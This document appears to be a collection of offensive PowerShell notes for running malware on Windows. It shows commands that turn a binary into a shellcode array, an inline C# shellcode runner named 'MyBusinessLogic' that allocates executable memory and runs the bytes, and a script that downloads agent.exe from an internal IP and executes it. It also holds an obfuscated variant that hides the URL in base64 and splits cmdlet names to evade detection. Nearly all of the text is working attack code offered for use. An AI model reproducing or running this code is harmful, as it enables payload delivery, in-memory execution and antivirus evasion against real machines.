Reformat shellcode
```powershell
xxd -p agent.bin | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > agent.payload
```

shellcode length
```powershell
cat agent.payload | tr ',' ' ' | wc -w
```

```powershell
# Author: thec0nci3rge
# The inline technique idea came from John Hammond's video: https://www.youtube.com/watch?v=EwEwRLedeKI
# The original C# snipped was found here: https://github.com/tbhaxor/CSharp-and-Infosec/blob/main/PInvoke%20MSF%20Payload/Program.cs

$MyBusinessLogic = @"
using System;
using System.Runtime.InteropServices;

public class MyBusinessLogic {
    static byte[] my_buf = new byte[<PUT_YOUR_SHELLCODE_LENGTH_HERE>] {
        <PUT_YOUR_SHELLCODE_HERE - e.g. "0x39,0xc0,0x73,0x1d,0x8b,...">
    };

    // declaring VirtualAlloc function from kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

    // create delegate signature for executor function
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void WindowRun();

    public static void Main() {
        // get pointer of allocated buffer
        IntPtr my_virt_alloc_pointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(my_buf.Length), 0x1000, 0x40);
        
        // write the buffer into memory
        Marshal.Copy(my_buf, 0x0, my_virt_alloc_pointer, my_buf.Length);
        
        // get function pointer of the allocated buffer
        WindowRun business_run_logic = Marshal.GetDelegateForFunctionPointer<WindowRun>(my_virt_alloc_pointer);
        
        // run "business-logic"
        business_run_logic();
    }
}
"@

# specifying Add-Type will force .NET to compile C# code
Add-Type $MyBusinessLogic

[MyBusinessLogic]::Main()
```

```powershell
# Define variables
$url = "http://10.10.14.2/agent.exe"
$exeName = "agent.exe"
$destPath = "C:\Users\Public"

# Full path to save the downloaded file
$fullPath = Join-Path -Path $destPath -ChildPath $exeName

# Download the file
Invoke-WebRequest -Uri $url -OutFile $fullPath

# Execute the file in a new process
Start-Process -FilePath $fullPath

```

```powershell
$a1 = "a" + "HR" + "0cDovLzE5Mi4xNjguMi4yMjg6ODA4MC9hZ2VudC5leGU="
$a2 = "Y" + "Wdlb" + "nQuZXhl"
$a3 = "Q" + "zpc" + "VXN" + "lcnNcU" + "HVibGlj"
function _ { 
    param($__)
    $d = [System.Convert]::FromBase64String($__)
    [System.Text.Encoding]::UTF8.GetString($d)
}
$u = & _ $a1
$n = & _ $a2
$p = & _ $a3
$f = (&('Joi' + 'n-Path') ($p) ($n))
$w = "i" + "wr"   
$x = "s" + "TarT" + "-pr" + "OCesS"         
& (Get-Command $w) -Uri $u -OutFile $f
& (Get-Command $x) $f

```